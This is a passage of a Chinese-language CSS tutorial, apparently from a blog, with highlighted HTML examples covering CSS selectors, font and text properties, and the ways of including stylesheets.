&#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;red&quot;</span>&gt;</span>刘德华<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;red&quot;</span>&gt;</span>张学友<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>黎明<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>郭富城<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="类选择器-多类名"><a href="#类选择器-多类名" class="headerlink" title="类选择器-多类名"></a>类选择器-多类名</h4><p>当三个元素或多个元素中存在不完全相同的样式时，即可使用多类名控制样式。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.box</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.red</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.green</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: green;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box red&quot;</span>&gt;</span>红色<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box green&quot;</span>&gt;</span>绿色<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box red&quot;</span>&gt;</span>红色<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="id选择器"><a href="#id选择器" class="headerlink" title="id选择器"></a>id选择器</h4><p>id选择器可以为标有id属性的html元素指定特定的样式。<br>html元素以id属性来设置id选择器，css中id选择器以#号来定义。<br>因为id在html具有唯一性，所以id选择器一般只会调用一次。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#red</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;red&quot;</span>&gt;</span>刘德华<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="通配符选择器"><a href="#通配符选择器" class="headerlink" title="通配符选择器"></a>通配符选择器</h4><p>更改页面中的所有元素样式。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        * &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>刘德华<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>郭富城<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>张学友<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CSS字体属性"><a href="#CSS字体属性" class="headerlink" title="CSS字体属性"></a>CSS字体属性</h2><h3 id="字体系列"><a href="#字体系列" class="headerlink" title="字体系列"></a>字体系列</h3><p>css中使用font-family属性来定义文本的字体，可以存在多个字体,当存在多个字体，依次排列，遇到客户端安装的字体就使用该字体解析，使用英文逗号分割，可以使用中文。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h2</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: <span class="string">&#x27;微软雅黑&#x27;</span>,initial;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>刘德华<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>郭富城<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="字体大小"><a href="#字体大小" class="headerlink" title="字体大小"></a>字体大小</h3><p>通过修改body标签的字体大小来实现修改全部文字的大小(标题标签除外),如果不设置大小，则使用浏览器默认字体。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>刘德华<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>郭富城<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>张学友<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="字体粗细"><a href="#字体粗细" class="headerlink" title="字体粗细"></a>字体粗细</h3><p>使用font-weight属性来定义字体样式，具体的属性值可以查询手册；还可以使用数字，100-900。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.bold</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>静夜思<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>创建明月光<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>疑是地上霜<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;bold&quot;</span>&gt;</span>举头望明月<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>低头思故乡<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="字体样式"><a href="#字体样式" class="headerlink" title="字体样式"></a>字体样式</h3><p>css中使用font-style来修改字体样式，具体属性值查看书册文档。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-style</span>: italic;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>静夜思<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>创建明月光<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>疑是地上霜<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>举头望明月<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>低头思故乡<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="字体复合属性"><a href="#字体复合属性" class="headerlink" title="字体复合属性"></a>字体复合属性</h3><p>字体属性可以把以上字体样式综合来写，这样可以减少代码书写量；书写中必须按照font-style font-weight font-size&#x2F;line-height fonr-family顺序来书写。<br>font-style font-weight可省略，font-size fonr-family必须要写。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/* font: font-style font-weight font-size/line-height fonr-family; */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">font</span>: italic <span class="number">700</span> <span class="number">16px</span> <span class="string">&#x27;微软雅黑&#x27;</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>三生三世十里桃花，一心一意百行代码<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="文本外观属性"><a href="#文本外观属性" class="headerlink" title="文本外观属性"></a>文本外观属性</h2><h3 id="文本颜色"><a href="#文本颜色" class="headerlink" title="文本颜色"></a>文本颜色</h3><p>css中使用color属性来设置字体颜色，值可以为预定义单词或者颜色的十六进制代码，还可以是RGB代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#ff0000</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">100%</span>, <span class="number">0%</span>, <span class="number">0%</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是一只快乐的土拨鼠<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="文本对齐"><a href="#文本对齐" class="headerlink" title="文本对齐"></a>文本对齐</h3><p>text-align属性用于设置元素内文本内容的对齐方式。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h1</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>万里长城永不倒<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="文本装饰"><a href="#文本装饰" class="headerlink" title="文本装饰"></a>文本装饰</h3><p>text-decoration属性用于设置元素内文本的显示修改，通常用于去除a标签的选下划线，值为none。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>菜单<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="文本缩进"><a href="#文本缩进" class="headerlink" title="文本缩进"></a>文本缩进</h3><p>text-indent属性用于指定文本的第一行的缩进，通常是将段落的首行缩进。<br>em是相对单位，一个em是当前字体大小，比如当前字体大小是16px,那么1em&#x3D;16px。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-indent</span>: <span class="number">2em</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>新华社北京9月16日电 中共中央总书记、国家主席、中央军委主席习近平近日对做好新时代民营经济统战工作作出重要指示指出，改革开放特别是党的十八大以来，民营经济统战工作不断加强和完善，在服务党和国家中心工作中发挥了重要作用。非公有制经济是社会主义市场经济的重要组成部分，促进非公有制经济健康发展和非公有制经济人士健康成长具有十分重要的意义。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>习近平强调，要坚持“两个毫不动摇”，把团结好、引导好民营经济人士作为一项重要任务。各级党委要加强对民营经济统战工作的领导，全面贯彻党的方针政策，抓好党中央各项决策部署贯彻落实。各级统一战线工作领导小组和党委统战部要发挥牵头协调作用，工商联要发挥群团组织作用，把民营经济人士团结在党的周围，更好推动民营经济健康发展，努力为新时代坚持和发展中国特色社会主义事业、实现中华民族伟大复兴的中国梦贡献力量。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="行间距"><a href="#行间距" class="headerlink" title="行间距"></a>行间距</h3><p>line-height属性用于设置行间的距离(行高)，可以控制文本行与行之间的距离。在line-height中也能使用em作为单位。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.line</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">line-height</span>: <span class="number">5em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是狗屁膏药<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;line&quot;</span>&gt;</span>莫埃老子<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>我最粘人<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CSS引入方式"><a href="#CSS引入方式" class="headerlink" title="CSS引入方式"></a>CSS引入方式</h2><h3 id="三种样式表"><a href="#三种样式表" class="headerlink" title="三种样式表"></a>三种样式表</h3><p>1、行内样式表(行内式)<br>2、内部样式表(嵌入式)<br>3、外部样式表(链接式)</p><h3 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h3><p>内部样式表(嵌入式)是把css代码写到html页面内部，将所有的css代码抽取出来，单独放到一个&lt;style&gt;标签中。内部样式表理论上可以放在html标签中的任意位置，但实际开发中都把style标签放到head标签中，它邮箱整个html页面。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.line</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">line-height</span>: <span class="number">5em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是狗屁膏药<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;line&quot;</span>&gt;</span>莫埃老子<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>我最粘人<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="行内样式表"><a href="#行内样式表" class="headerlink" title="行内样式表"></a>行内样式表</h3><p>行内样式表(内联样式表)是在元素标签内部的style属性中设定css样式。适合简单修改，只会影响当前标签。语法规划和内部样式表一致。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>长江后浪推前浪<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color: red;&quot;</span>&gt;</span>前浪死在沙滩上<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h3><p>实际开发中都是外部样式表，适合与样式比较多的情况，核心是：样式表单独写到css文件中，之后把css文件引入到html页面中使用。<br>1、新建css文件，里面不需要标签，直接写样式即可。<br>2、把css文件引入到html页面中，使用link标签引入css文件。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>来呀~快活啊...反正有大把时光~<span class="tag">&lt;/<span 